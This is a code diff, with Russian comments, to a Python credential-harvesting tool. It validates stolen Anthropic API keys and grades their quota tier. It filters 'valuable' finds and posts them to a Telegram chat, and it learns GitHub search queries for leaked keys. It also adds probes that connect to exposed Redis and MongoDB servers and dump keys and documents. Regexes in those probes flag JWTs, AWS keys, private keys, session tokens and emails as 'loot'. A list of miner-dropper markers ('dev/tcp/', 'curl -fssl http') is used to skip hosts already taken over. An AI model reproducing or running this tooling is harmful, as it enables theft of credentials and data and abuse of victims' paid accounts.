+def _origin_bucket(origin):
+    """Нормализация origin для статистики источников: «leakix:1.2.3.4» ->
+    «leakix», сырая ссылка «https://host/path» -> «web:host».
+    АУДИТ-фикс 2026-09-13: раньше split(":")[0] на URL давал «https» —
+    feeds/searxng/marginalia слипались в один бесполезный бакет, и
+    update_source_priority учился на мусоре."""
+    o = str(origin or "")
+    if o.startswith(("http://", "https://")):
+        m = re.match(r"https?://([^/:]+)", o)
+        return "web:" + (m.group(1) if m else o[:40])
+    return o.split(":")[0] if ":" in o else o[:40]
 
 
 # ------------------------------------------------------------------ VALIDATOR
@@ -13352,7 +13730,7 @@ def validate_anthropic(key):
             "Content-Type": "application/json",
         }
     try:
-        r = http(
+        r, rhdrs = http(
             "POST",
             base + "/v1/messages",
             timeout=(10, 30),
@@ -13362,10 +13740,54 @@ def validate_anthropic(key):
                 "max_tokens": 4,
                 "messages": [{"role": "user", "content": "hi"}],
             },
+            want_headers=True,
         )
         if r.status_code == 200:
             # ТИР-ТЕСТ: haiku работает и у free! sonnet=PRO, opus=MAX
             tier = _oat01_tier(key) if key.startswith("sk-ant-oat") else "api03"
+            # API03-RATELIMIT FINGERPRINT: на 200-пробе Anthropic отдаёт
+            # anthropic-ratelimit-* — по ним видно workspace ли это (админские
+            # лимиты, например 10000 RPM / 12M TPM) и не задушен ли haiku.
+            # Раньше тир был мёртвой строкой "Anthropic official" — жирные
+            # workspace-ключи ничем не отличались от prepaid.
+            rl = {}
+            for _k, _v in (rhdrs or {}).items():
+                kl = str(_k).lower()
+                if kl.startswith("anthropic-ratelimit-") and kl.endswith("-limit"):
+                    rl[kl.replace("anthropic-ratelimit-", "").replace("-limit", "")] = (
+                        _v
+                    )
+            rl_note = ""
+            if rl and not key.startswith("sk-ant-oat"):
+
+                def _ri(x):
+                    try:
+                        return int(str(rl.get(x, "0")).strip())
+                    except Exception:
+                        return 0
+
+                rpm, itpm, otpm = (
+                    _ri("requests"),
+                    _ri("input-tokens"),
+                    _ri("output-tokens"),
+                )
+                if rpm >= 1000 or itpm >= 1000000:
+                    tier = "api03 WORKSPACE жирный [%d RPM / %sM in-TPM]" % (
+                        rpm,
+                        itpm // 1000000,
+                    )
+                elif rpm >= 50:
+                    tier = "api03 tier-std [%d RPM]" % rpm
+                else:
+                    tier = "api03 ДУШКА [%d RPM / %s in-TPM]" % (
+                        rpm,
+                        rl.get("input-tokens", "?"),
+                    )
+                rl_note = "rate-limit: %d RPM / in %s / out %s" % (
+                    rpm,
+                    rl.get("input-tokens", "?"),
+                    rl.get("output-tokens", "?"),
+                )
             # РЕАЛЬНЫЙ список моделей аккаунта (не хардкод!)
             models_real, stars_real = [], []
             try:
@@ -13409,21 +13831,41 @@ def validate_anthropic(key):
                 "balance": None,
                 "tier": ("Anthropic OAuth [%s]" % tier)
                 if key.startswith("sk-ant-oat")
-                else "Anthropic official",
+                else tier,
                 "usage": None,
                 "embed": None,
                 "rerank": None,
                 "status": "listed_only" if is_free else "working",
-                "note": "haiku 200 OK, тир: %s%s"
+                "note": "haiku 200 OK, тир: %s%s%s"
                 % (
                     tier,
                     " (free-tier: sonnet/opus недоступны)" if is_free else "",
+                    ("; " + rl_note) if rl_note else "",
                 ),
             }
         if r.status_code == 429:
             # 429 rate_limit = ТОКЕН ЖИВ (auth прошла!), окно 5h/7d выжжено.
             # Раньше: return None -> seen -> потерян НАВСЕГДА. Теперь храним —
             # recheck поймает сброс окна. Tier НЕ пробуем: все пробы дадут 429.
+            # WORKSPACE-ДУШКА: на 429 тоже приходят rate-limit хедеры — у них
+            # reset указывает на месяцы вперёд (месячная/годовая квота выжжена
+            # до нуля: "1 input tokens per minute, reset 2027-02"). Отличаем
+            # от обычного 5h-окна, чтобы не спамить recheck'ами мёртвые ключи.
+            _rl_reset = ""
+            for _k, _v in (rhdrs or {}).items():
+                if str(_k).lower() == "anthropic-ratelimit-input-tokens-reset":
+                    _rl_reset = str(_v)
+                    break
+            _dushka = False
+            if _rl_reset:
+                try:
+                    _rr = datetime.datetime.fromisoformat(
+                        _rl_reset.replace("Z", "+00:00")
+                    )
+                    if (_rr - datetime.datetime.now(datetime.timezone.utc)).days > 20:
+                        _dushka = True
+                except Exception:
+                    pass
             return {
                 "key": key,
                 "base": base + "/v1",
@@ -13437,12 +13879,19 @@ def validate_anthropic(key):
                 "balance": None,
                 "tier": ("Anthropic OAuth [429-окно выжжено]")
                 if key.startswith("sk-ant-oat")
+                else ("Anthropic ДУШКА [квота до %s]" % _rl_reset[:10])
+                if _dushka
                 else "Anthropic official [429 rate-limit]",
                 "usage": None,
                 "embed": None,
                 "rerank": None,
-                "status": "listed_only",
-                "note": "429 rate-limit: токен ВАЛИДЕН (auth прошла), окно исчерпано — ждём сброса",
+                "status": "listed_only" if not _dushka else "no_balance",
+                "note": (
+                    "429 rate-limit: токен ВАЛИДЕН (auth прошла), окно исчерпано — ждём сброса"
+                    if not _dushka
+                    else "429 workspace-квота: input-limit задушен, сброс %s — до этой даты мёртв"
+                    % _rl_reset
+                ),
             }
         # Cloudflare-блок датацентрового IP / перегрузка — НЕ смерть ключа!
         # (403 без auth-маркеров, 529 overloaded, 5xx) -> unverified для ретрая
@@ -14279,7 +14728,7 @@ def cc_proxy_sweep(cycle=0):
                 except Exception:
                     pass
         try:
-            json.dump(_known, open(_known_path, "w", encoding="utf-8"), indent=1)
+            _atomic_json_dump(_known_path, _known, indent=1)
         except Exception:
             pass
         return fat
@@ -14375,6 +14824,64 @@ def render_report(v):
     return "\n".join(lines)
 
 
+_TG_UPDATE_OFFSET_PATH = os.path.join(HERE, "tg_update_offset.json")
+
+
+def _tg_update_offset():
+    """Персистентный offset для getUpdates: один апдейт обрабатывается ОДИН раз.
+    (было: каждый цикл перечитывал хвост — ключи из чата бота ревалидировались
+    и репостились до бесконечности)."""
+    try:
+        return int(json.load(open(_TG_UPDATE_OFFSET_PATH, encoding="utf-8")) or 0)
+    except Exception:
+        return 0
+
+
+def _tg_save_update_offset(v):
+    try:
+        _atomic_json_dump(_TG_UPDATE_OFFSET_PATH, int(v))
+    except Exception:
+        pass
+
+
+def tg_ingest_keys():
+    """📥 INGEST из чата бота: dj кидает ключи прямо в TG — бот подбирает их
+    как кандидатов (обычный пайплайн: валидация -> стор -> репорт). Раньше
+    ручной проверки не было: getUpdates использовался ТОЛЬКО для захвата
+    chat_id, текст сообщений игнорировался."""
+    if not CFG.get("tg_token"):
+        return []
+    out = []
+    try:
+        off = _tg_update_offset()
+        url = (
+            "https://api.telegram.org/bot%s/getUpdates?limit=50&timeout=0"
+            % CFG["tg_token"]
+        )
+        if off:
+            url += "&offset=%d" % off
+        r = http("GET", url, timeout=(10, 25))
+        if r is None or r.status_code != 200:
+            return out
+        new_off = off
+        for u in r.json().get("result") or []:
+            uid = u.get("update_id")
+            if uid is not None:
+                new_off = max(new_off, uid + 1)
+            msg = u.get("message") or u.get("channel_post") or {}
+            txt = msg.get("text") or ""
+            if len(txt) < 8:
+                continue
+            if txt.lstrip().startswith("/"):
+                continue
+            out.append((txt, "tg-chat-ingest"))
+        if new_off != off:
+            _tg_save_update_offset(new_off)
+    except Exception:
+        pass
+    return out
+
+
 def tg_discover_chat():
     """Авто-дискавери chat_id: если пользователь отправил /start боту —
     ловим его chat id через getUpdates и сохраняем в конфиг."""
@@ -14406,12 +14913,7 @@ def tg_discover_chat():
                 try:
                     cfg2 = json.load(open(CONFIG_PATH, encoding="utf-8"))
                     cfg2["tg_chat"] = cid
-                    json.dump(
-                        cfg2,
-                        open(CONFIG_PATH, "w", encoding="utf-8"),
-                        ensure_ascii=False,
-                        indent=2,
-                    )
+                    _atomic_json_dump(CONFIG_PATH, cfg2, indent=2)
                 except Exception:
                     pass
                 log(
@@ -14475,6 +14977,9 @@ def post_finding_now(v, post=True):
         )
         # ХЛАМ НЕ НУЖЕН: постим только ценное — звёздные модели,
         # подписочные/денежные теги, жирный баланс.
+        # АУДИТ-фикс 2026-09-12: tg-bot/npm/shopify/instagram/linear/roblox/
+        # steam/x-session/twilio ВЫКИНУТЫ из valuable — токен чужого бота
+        # или шопифи-магазина не даёт LLM-квоты, это спам в чате.
         star_hit = bool(v.get("stars_working") or v.get("stars_listed"))
         valuable_tag = v.get("tag") in (
             "anthropic",
@@ -14485,29 +14990,17 @@ def post_finding_now(v, post=True):
             "gcookie",
             "websess",
             "db-dsn",
-            "discord",
             "openai",
             "openai-svcacct",
             "email-cred",
             "stripe",
-            "tg-bot",
             "open-infra",
             "laravel-appkey",
             "gocspx",
             "cloudflare",
-            "npm",
-            "twilio",
-            "shopify",
-            "linear",
-            "roblox",
-            "steam",
-            "instagram",
-            "x-session",
             "cursor-web",
             "supabase-auth",
             "baseten",
-            "anthropic-refresh",
-            "anthropic-admin",
             "codex",
             "google",
             "replicate",
@@ -14519,11 +15012,51 @@ def post_finding_now(v, post=True):
         nonllm_working = v.get("tag") in NON_LLM_TAGS and status == "working"
         fat_balance = (v.get("balance") or 0) >= 1
         many_models = (v.get("n_models") or 0) >= 100
+        # АУДИТ-фикс 2026-09-12: ЖЁСТКИЙ блок-лист постинга. Эти теги — не
+        # LLM-выгода: чужой tg-бот, шопифи, инстаграм, npm-пакет, сессия
+        # роблокса. nonllm_working их пропускал ("working = ценно"), но
+        # рабочий токен бота не даёт ни квоты, ни денег — только спам в чат.
+        TG_POST_BLOCKLIST = {
+            "tg-bot",
+            "instagram",
+            "figma",
+            "linear",
+            "npm",
+            "roblox",
+            "steam",
+            "x-session",
+            "twilio",
+            "shopify",
+            "slack",
+            "slack-webhook",
+            "sentry",
+            "discord",
+            "sendgrid",
+            "airtable",
+            "notion",
+        }
+        if v.get("tag") in TG_POST_BLOCKLIST:
+            log("  🔕 пропущен постинг: %s — не LLM-выгода (блок-лист)" % v.get("tag"))
+            v["_tg_posted"] = True
+            return False
         # quota-fresh правило: MAX с выжженным окном квоты — в стор, не в чат.
         # окно обнуляется за ~5ч, но «победой» с нулевым остатком не спамим
         quota_burned = "выжжено" in str(v.get("tier") or "") or "выжжено" in str(
             v.get("note") or ""
         )
+        # 2026-09-11: open-infra спам-гейт. dify/litellm-default/sk-1234 и
+        # openwebui с gpt-3.5/gpt-4o-mini — «нищие модельки»: в стор да, в
+        # чат НЕТ (663 из 800 последних находок были именно они). Жирное из
+        # той же категории — Ray Dashboard / Jupyter (RCE), ComfyUI (GPU).
+        if v.get("tag") == "open-infra":
+            _infra_t = str(v.get("tier") or "").lower()
+            if not any(
+                m in _infra_t
+                for m in ("rce", "jupyter", "ray dashboard", "comfyui", "gpu")
+            ):
+                log("  🔕 пропущен постинг: open-infra нищий (dify/litellm-default)")
+                v["_tg_posted"] = True
+                return False
         if (
             post
             and status in ("working", "listed_only")
@@ -14595,6 +15128,9 @@ def _store_khash_index():
     if _STORE_KHASH is None:
         _STORE_KHASH = set()
         try:
+            # АУДИТ Фаза 3: страж роста — индекс строится полным проходом файла
+            if os.path.getsize(STORE_PATH) > 100 * 1024 * 1024:
+                log("⚠️ found.jsonl >100МБ — пора ротацию (Фаза 3)")
             with open(STORE_PATH, encoding="utf-8") as f:
                 for line in f:
                     if not line.strip():
@@ -14687,7 +15223,7 @@ def source_health_begin_cycle():
             _save_source_health(data)
 
 
-def note_source_health(source_name, ok, reason=""):
+def note_source_health(source_name, ok, reason="", n_chunks=None):
     """Record a completed source call and open the breaker after 3 failures."""
     with SOURCE_HEALTH_LOCK:
         data: typing.Dict[str, typing.Any] = _load_source_health()
@@ -14696,6 +15232,21 @@ def note_source_health(source_name, ok, reason=""):
             dict(raw_entry) if isinstance(raw_entry, dict) else {}
         )
         if ok:
+            # 0 chunks = мягкий failure (источник жив, но не находит)
+            if n_chunks is not None and n_chunks == 0:
+                try:
+                    zero_cycles = int(entry.get("zero_cycles", 0)) + 1
+                except Exception:
+                    zero_cycles = 1
+                entry["zero_cycles"] = zero_cycles
+                if zero_cycles >= 3:
+                    entry["zero_cycles"] = 0
+                    entry["skip_left"] = 3
+                    log(
+                        "  ⏸️  [%s] 3 цикла 0 chunks — автоскип на 3 цикла" % source_name
+                    )
+            else:
+                entry["zero_cycles"] = 0
             entry["failures"] = 0
             entry["skip_left"] = 0
         else:
@@ -14868,8 +15419,10 @@ def run_sources(extra_paths=()):
         "baseten-hunter",
         # 📡 TG-поисковики: контент каналов сцены (комблисты/аккаунты)
         "tg-search",
+        # малый веб без challenge — где DDG/Bing глухо
+        "marginalia",
     }
-    all_sources = [cls() for cls in ALL_SOURCE_CLASSES]
+    all_sources = _build_all_sources()
     # жёсткий выключатель из конфига (open-infra и прочий слабый шум — вон)
     disabled = set(CFG.get("disabled_sources", []))
     if disabled:
@@ -14972,7 +15525,7 @@ def run_sources(extra_paths=()):
                     res = f.result(timeout=5)
                     nbytes = sum(len(t) for t, _ in res)
                     chunks.extend(res)
-                    note_source_health(s.name, True)
+                    note_source_health(s.name, True, n_chunks=len(res))
                     log(
                         "  [%-16s] %d chunks, %d KB"
                         % (s.name, len(res), nbytes // 1024)
@@ -15084,8 +15637,9 @@ def deep_scan_on_find(origin, deadline=None):
                 # берем последние 5 gists юзера
                 try:
                     gh_headers = {"Accept": "application/vnd.github+json"}
-                    if gh_token():
-                        gh_headers["Authorization"] = "Bearer " + gh_token()
+                    _tok = gh_token()  # один слот ротации: проверка и заголовок
+                    if _tok:
+                        gh_headers["Authorization"] = "Bearer " + _tok
                     r = http(
                         "GET",
                         f"https://api.github.com/users/{username}/gists?per_page=5",
@@ -15242,6 +15796,40 @@ _VAR_JUNK = re.compile(
     r"NEXT_PUBLIC|_ANON_|PUBLIC_|_PUBLIC|EXAMPLE|SAMPLE|TEST_KEY",
     re.I,
 )
+# LOOT-TRIAGE (аудит Фаза 7, 2026-09-13): источник-яд. Имя переменной может
+# быть честным (CI_JOB_TOKEN), но если выучено из тест-фикстуры — запрос
+# ищет ДОКИ/МОКИ и жрёт слоты ротации вечно (кейс: gitlabhq/mock_data.js).
+_ORIGIN_POISON_RE = re.compile(
+    r"mock|fixture|/__tests?__|/tests?/|/specs?/|\.spec\.|\.test\.|sample|"
+    r"example|dummy|fake|stub|placeholder|/demo/|/docs?/|testdata",
+    re.I,
+)
+_EVOLVED_RUNS_MAX = 10  # столько слотов ротации без хитов = мусор вон
+_EVOLVED_AGE_MAX = 5 * 86400  # 5 дней без единого хита = мусор вон
+
+
+def _evolved_janitor(ev):
+    """Дворник пула эволюции: выносит запросы-мусор. Правила: 0 хитов и
+    (runs >= _EVOLVED_RUNS_MAX или возраст > _EVOLVED_AGE_MAX или origin-яд).
+    Без него пул забивается нулевыми зомби и кап 200 блокирует НОВОЕ обучение."""
+    now = time.time()
+    dead = [
+        k
+        for k, i in ev.items()
+        if not i.get("hits")
+        and (
+            i.get("runs", 0) >= _EVOLVED_RUNS_MAX
+            or now - i.get("added", now) > _EVOLVED_AGE_MAX
+            or _ORIGIN_POISON_RE.search(str(i.get("origin", "")))
+        )
+    ]
+    for k in dead:
+        ev.pop(k, None)
+    if dead:
+        log("  🧹 LOOT-TRIAGE: выкинуто %d нулевых запросов-зомби" % len(dead))
+    return len(dead)
+
+
 _KNOWN_VARS = {
     "OPENAI_API_KEY",
     "ANTHROPIC_API_KEY",
@@ -15294,11 +15882,8 @@ def _evolved_load():
 def _evolved_save():
     with _EVOLVED_LOCK:
         try:
-            json.dump(
-                _EVOLVED_CACHE,
-                open(EVOLVED_PATH, "w", encoding="utf-8"),
-                ensure_ascii=False,
-            )
+            # АУДИТ-фикс: атомарно (крах = потеря всех выученных запросов)
+            _atomic_json_dump(EVOLVED_PATH, _EVOLVED_CACHE)
         except Exception:
             pass
 
@@ -15310,6 +15895,9 @@ def evolve_from_text(text, origin=""):
     """🧬 Горячий файл (далал кандидатов) -> учим новые имена переменных.
     TG-дайджест батчем в конце цикла (не спамим на каждый файл)."""
     try:
+        # LOOT-TRIAGE: из фикстур/доков не учим — такие запросы ищут моки
+        if origin and _ORIGIN_POISON_RE.search(str(origin)):
+            return
         new_found = []
         with _EVOLVED_LOCK:
             ev = _evolved_load()
@@ -15324,6 +15912,7 @@ def evolve_from_text(text, origin=""):
                     "added": time.time(),
                     "origin": str(origin)[:100],
                     "hits": 0,
+                    "runs": 0,
                     "notified": False,
                 }
                 new_found.append(var)
@@ -15374,6 +15963,7 @@ def evolve_strategies():
                                 "added": time.time(),
                                 "origin": "mutant-ext:%s" % q[:35],
                                 "hits": 0,
+                                "runs": 0,
                                 "notified": False,
                             }
                             added += 1
@@ -15387,6 +15977,7 @@ def evolve_strategies():
                                 "added": time.time(),
                                 "origin": "mutant-path:%s" % q[:35],
                                 "hits": 0,
+                                "runs": 0,
                                 "notified": False,
                             }
                             added += 1
@@ -15414,13 +16005,27 @@ def evolve_flush_digest():
 
 
 def evolved_queries_for_rotation(n=4):
-    """Свежайшие эволюционные запросы -> в батч github-code."""
+    """Свежайшие эволюционные запросы -> в батч github-code.
+    LOOT-TRIAGE: слот получают только живые (hits>0) или неиспытанные
+    (runs < RUNS_MAX); 0-хитовые зомби выносятся дворником, а не жрут
+    слоты вечно. runs++ за каждый выданный слот — счётчик испытаний."""
     try:
-        ev = _evolved_load()
-        recent = sorted(
-            ev.items(), key=lambda kv: (-kv[1].get("hits", 0), -kv[1].get("added", 0))
-        )[:n]
-        return [info["query"] for _var, info in recent]
+        with _EVOLVED_LOCK:
+            ev = _evolved_load()
+            _evolved_janitor(ev)
+            live = [
+                (var, info)
+                for var, info in ev.items()
+                if info.get("hits") or info.get("runs", 0) < _EVOLVED_RUNS_MAX
+            ]
+            recent = sorted(
+                live, key=lambda kv: (-kv[1].get("hits", 0), -kv[1].get("added", 0))
+            )[:n]
+            for _var, info in recent:
+                info["runs"] = info.get("runs", 0) + 1
+            if recent:
+                _evolved_save()
+            return [info["query"] for _var, info in recent]
     except Exception:
         return []
 
@@ -15446,10 +16051,466 @@ def evolved_query_hit(query, n_items):
         pass
 
 
+# ------------------------------------------------------------------ OPEN-DB DEEP PROBE
+# 2026-09-11 overhaul: MONGO/REDIS больше не слепой спам "порт открыт".
+# Redis: честный RESP-парсер (regex-разбор SCAN хватал курсор как ключ и
+# терял hash/list-значения), дамп до 40 ключей всех типов, детект
+# майнер-оккупации (xmr_cron/backup*/cron_inject) — занятые хосты в TG НЕ
+# постим: там уже сидит чужой дроппер, лута нет.
+# Mongo: настоящий wire protocol (BSON + OP_MSG руками, без драйвера):
+# hello -> listDatabases -> listCollections -> find(2). Auth-required и
+# мёртвые хосты — молча в стор. Пост ТОЛЬКО после анализа и ТОЛЬКО с инфой.
+
+import struct as _odb_struct
+
+
+_ODB_LOOT_RES = (
+    (
+        "jwt",
+        re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}"),
+    ),
+    ("bcrypt", re.compile(r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}")),
+    ("aws_key", re.compile(r"AKIA[0-9A-Z]{16}")),
+    ("ssh_pub", re.compile(r"ssh-(?:rsa|ed25519)\s+[A-Za-z0-9+/=]{40,}")),
+    ("privkey", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
+    ("email", re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")),
+    (
+        "session_tok",
+        re.compile(r"(?:session|sess|token|sid)[\"':= ]+([A-Za-z0-9_\-]{16,})", re.I),
+    ),
+)
+_ODB_MINER_MARKERS = (
+    "xmrig",
+    "xmr_cron",
+    "cron_inject",
+    "|base64",
+    "base64${ifs}",
+    "base64 -d",
+    "/tmp/.d/",
+    "wget -q -o-",
+    "curl -fssl http",
+    "pkill -f",
+    "stratum+tcp",
+    "dev/tcp/",
+)
+_ODB_MINER_KEYS = (
+    "xmr_cron",
+    "cron_inject",
+    "backup1",
+    "backup2",
+    "backup3",
+    "backup4",
+    "backup5",
+    "sshauthorize",
+)
+
+
+def _odb_classify(text, key_hint=""):
+    """Найти жирное в значении. -> [(kind, snippet)] (дедуп по kind)."""
+    out, seen_k = [], set()
+    if not text:
+        return out
+    s = str(text)
+    for kind, rx in _ODB_LOOT_RES:
+        if kind in seen_k:
+            continue
+        m = rx.search(s)
+        if m:
+            if kind == "email" and not re.search(
+                r"mail|user|email|account|login|session|profile", key_hint, re.I
+            ):
+                continue  # emails шумят — только в юзерских контекстах
+            out.append((kind, m.group(0)[:120]))
+            seen_k.add(kind)
+    return out
+
+
+def _odb_is_miner(key, val):
+    hay = (str(key) + " " + str(val)).lower()
+    return any(m in hay for m in _ODB_MINER_MARKERS)
+
+
+# ---- Redis RESP (минимальный честный парсер) ----
+
+
+def _r_line(sock):
+    data = b""
+    while b"\r\n" not in data:
+        chunk = sock.recv(1)
+        if not chunk:
+            return None
+        data += chunk
+    return data[:-2].decode("utf-8", "replace")
+
+
+def _r_read(sock, n):
+    data = b""
+    while len(data) < n + 2:
+        chunk = sock.recv(min(8192, n + 2 - len(data)))
+        if not chunk:
+            break
+        data += chunk
+    return data[:n].decode("utf-8", "replace")
+
+
+def _r_reply(sock):
+    """Один RESP-ответ -> python-объект (str/int/list/Exception/None)."""
+    line = _r_line(sock)
+    if line is None or not line:
+        return None
+    p, rest = line[0], line[1:]
+    if p == "+":
+        return rest
+    if p == "-":
+        return Exception(rest)
+    if p == ":":
+        try:
+            return int(rest)
+        except ValueError:
+            return rest
+    if p == "$":
+        try:
+            n = int(rest)
+        except ValueError:
+            return None
+        if n < 0:
+            return None
+        if n > 500_000:
+            return "<blob %d bytes>" % n
+        return _r_read(sock, n)
+    if p == "*":
+        try:
+            n = int(rest)
+        except ValueError:
+            return None
+        if n < 0:
+            return None
+        return [_r_reply(sock) for _ in range(min(n, 500))]
+    return rest
+
+
+def _r_cmd(sock, *args):
+    buf = b"*%d\r\n" % len(args)
+    for a in args:
+        b = str(a).encode("utf-8", "replace")
+        buf += b"$%d\r\n%s\r\n" % (len(b), b)
+    sock.sendall(buf)
+    return _r_reply(sock)
+
+
+def _redis_deep_dump(ip, port, limit=40, timeout=6):
+    """Read-only дамп: INFO -> SCAN -> TYPE/GET/HGETALL/LRANGE/SRANDMEMBER.
+    -> dict | None (None = мёртв/auth)."""
+    import socket as _s
+
+    try:
+        sock = _s.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except Exception:
+        return None
+    try:
+        pong = _r_cmd(sock, "PING")
+        if not (isinstance(pong, str) and "PONG" in pong):
+            sock.close()
+            return None
+        info = _r_cmd(sock, "INFO")
+        info = info if isinstance(info, str) else ""
+        keys_total = sum(int(x) for x in re.findall(r"db\d+:keys=(\d+)", info))
+        m_ver = re.search(r"redis_version:([\d.]+)", info)
+        ver = m_ver.group(1) if m_ver else "?"
+        # SCAN вместо KEYS * — не душим прод блокирующей командой
+        keys, cursor = [], "0"
+        for _ in range(4):
+            rep = _r_cmd(sock, "SCAN", cursor, "COUNT", 100)
+            if not (isinstance(rep, list) and len(rep) == 2):
+                break
+            cursor = str(rep[0])
+            keys.extend(k for k in (rep[1] or []) if isinstance(k, str))
+            if cursor == "0" or len(keys) >= limit:
+                break
+        keys = keys[:limit]
+        samples, juicy, miner = [], [], False
+        for k in keys:
+            try:
+                t = _r_cmd(sock, "TYPE", k)
+                t = t if isinstance(t, str) else "?"
+                val = None
+                if t == "string":
+                    val = _r_cmd(sock, "GET", k)
+                elif t == "hash":
+                    h = _r_cmd(sock, "HGETALL", k)
+                    if isinstance(h, list):
+                        val = json.dumps(
+                            {
+                                str(h[i]): str(h[i + 1])[:80]
+                                for i in range(0, min(len(h) - 1, 20), 2)
+                            },
+                            ensure_ascii=False,
+                        )[:400]
+                        for i in range(0, min(len(h) - 1, 20), 2):
+                            for kd, _sn in _odb_classify(h[i + 1], str(h[i])):
+                                juicy.append(
+                                    (kd, "%s.%s" % (k, h[i]), str(h[i + 1])[:100])
+                                )
+                elif t == "list":
+                    l = _r_cmd(sock, "LRANGE", k, 0, 2)
+                    if isinstance(l, list):
+                        val = json.dumps([str(x)[:80] for x in l], ensure_ascii=False)
+                elif t == "set":
+                    l = _r_cmd(sock, "SRANDMEMBER", k, 3)
+                    if isinstance(l, list):
+                        val = json.dumps([str(x)[:80] for x in l], ensure_ascii=False)
+                elif t == "zset":
+                    l = _r_cmd(sock, "ZRANGE", k, 0, 2)
+                    if isinstance(l, list):
+                        val = json.dumps([str(x)[:80] for x in l], ensure_ascii=False)
+                if isinstance(val, Exception):
+                    val = None
+                if val:
+                    samples.append((k, t, str(val)[:150]))
+                    for kd, snip in _odb_classify(val, k):
+                        juicy.append((kd, k, snip))
+                    if _odb_is_miner(k, val):
+                        miner = True
+                if str(k).lower() in _ODB_MINER_KEYS:
+                    miner = True
+            except Exception:
+                break
+        try:
+            sock.close()
+        except Exception:
+            pass
+        seen_j, juicy_d = set(), []
+        for kd, k, snip in juicy:
+            sig = (kd, snip[:60])
+            if sig not in seen_j:
+                seen_j.add(sig)
+                juicy_d.append((kd, k, snip))
+        return {
+            "keys_total": keys_total,
+            "version": ver,
+            "n_sampled": len(samples),
+            "samples": samples,
+            "juicy": juicy_d[:15],
+            "miner": miner,
+        }
+    except Exception:
+        try:
+            sock.close()
+        except Exception:
+            pass
+        return None
+
+
+# ---- MongoDB wire protocol (BSON + OP_MSG руками, без драйвера) ----
+
+
+def _bson_enc(doc):
+    """dict -> BSON. Типы: str/int/bool/float/None/dict/list."""
+    out = b""
+    for k, v in doc.items():
+        k_b = k.encode() + b"\x00"
+        if isinstance(v, bool):
+            out += b"\x08" + k_b + (b"\x01" if v else b"\x00")
+        elif isinstance(v, int):
+            if -(2**31) <= v < 2**31:
+                out += b"\x10" + k_b + _odb_struct.pack("<i", v)
+            else:
+                out += b"\x12" + k_b + _odb_struct.pack("<q", v)
+        elif isinstance(v, float):
+            out += b"\x01" + k_b + _odb_struct.pack("<d", v)
+        elif isinstance(v, str):
+            b = v.encode()
+            out += b"\x02" + k_b + _odb_struct.pack("<i", len(b) + 1) + b + b"\x00"
+        elif isinstance(v, dict):
+            out += b"\x03" + k_b + _bson_enc(v)
+        elif isinstance(v, (list, tuple)):
+            out += b"\x04" + k_b + _bson_enc({str(i): x for i, x in enumerate(v)})
+        elif v is None:
+            out += b"\x0a" + k_b
+        else:
+            b = str(v).encode()
+            out += b"\x02" + k_b + _odb_struct.pack("<i", len(b) + 1) + b + b"\x00"
+    return _odb_struct.pack("<i", len(out) + 5) + out + b"\x00"
+
+
+def _bson_dec(buf, off=0):
+    """BSON -> (dict, new_off). Битые/обрезанные документы -> partial."""
+    if off + 4 > len(buf):
+        return {}, len(buf)
+    size = _odb_struct.unpack_from("<i", buf, off)[0]
+    end = off + size
+    if size < 5 or end > len(buf):
+        end = len(buf)
+    doc, p = {}, off + 4
+    while p < end - 1:
+        t = buf[p]
+        p += 1
+        z = buf.find(b"\x00", p, end)
+        if z < 0:
+            break
+        name = buf[p:z].decode("utf-8", "replace")
+        p = z + 1
+        try:
+            if t == 0x01:
+                doc[name] = _odb_struct.unpack_from("<d", buf, p)[0]
+                p += 8
+            elif t == 0x02:
+                n = _odb_struct.unpack_from("<i", buf, p)[0]
+                p += 4
+                doc[name] = buf[p : p + max(0, n - 1)].decode("utf-8", "replace")
+                p += n
+            elif t in (0x03, 0x04):
+                sub, p = _bson_dec(buf, p)
+                doc[name] = list(sub.values()) if t == 0x04 else sub
+            elif t == 0x05:
+                n = _odb_struct.unpack_from("<i", buf, p)[0]
+                p += 5 + max(0, n)
+            elif t == 0x07:
+                doc[name] = buf[p : p + 12].hex()
+                p += 12
+            elif t == 0x08:
+                doc[name] = bool(buf[p])
+                p += 1
+            elif t in (0x09, 0x11, 0x12):
+                doc[name] = _odb_struct.unpack_from("<q", buf, p)[0]
+                p += 8
+            elif t == 0x0A:
+                doc[name] = None
+            elif t == 0x10:
+                doc[name] = _odb_struct.unpack_from("<i", buf, p)[0]
+                p += 4
+            else:
+                break
+        except Exception:
+            break
+    return doc, end
+
+
+_MONGO_REQID = [0]
+
+
+def _mongo_cmd(sock, body):
+    """OP_MSG (kind 0) -> reply doc. Read-only команды только."""
+    _MONGO_REQID[0] += 1
+    payload = _odb_struct.pack("<i", 0) + b"\x00" + _bson_enc(body)
+    msg = (
+        _odb_struct.pack("<iiii", 16 + len(payload), _MONGO_REQID[0], 0, 2013) + payload
+    )
+    sock.sendall(msg)
+    hdr = b""
+    while len(hdr) < 16:
+        c = sock.recv(16 - len(hdr))
+        if not c:
+            raise IOError("mongo closed")
+        hdr += c
+    mlen = _odb_struct.unpack("<i", hdr[:4])[0]
+    if mlen < 21 or mlen > 4_000_000:
+        raise IOError("mongo bad len")
+    body_b = b""
+    while len(body_b) < mlen - 16:
+        c = sock.recv(min(262144, mlen - 16 - len(body_b)))
+        if not c:
+            break
+        body_b += c
+    if len(body_b) < 5:
+        return {}
+    doc, _ = _bson_dec(body_b, 5)  # flags(4) + section kind(1) + doc
+    return doc
+
+
+def _mongo_deep_probe(ip, port, timeout=6, max_dbs=3):
+    """hello -> listDatabases (auth?) -> listCollections -> find(2).
+    -> dict | None (None = мёртв). auth_required=True если просит логин."""
+    import socket as _s
+
+    out = {
+        "alive": False,
+        "auth_required": False,
+        "version": "?",
+        "dbs": [],
+        "colls": {},
+        "juicy": [],
+        "samples": [],
+    }
+    try:
+        sock = _s.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except Exception:
+        return None
+    try:
+        hello = _mongo_cmd(sock, {"hello": 1, "$db": "admin"})
+        if not hello:
+            hello = _mongo_cmd(sock, {"isMaster": 1, "$db": "admin"})
+        if not hello or (
+            hello.get("ok") not in (1, 1.0)
+            and "ismaster" not in hello
+            and "isWritablePrimary" not in hello
+        ):
+            sock.close()
+            return None
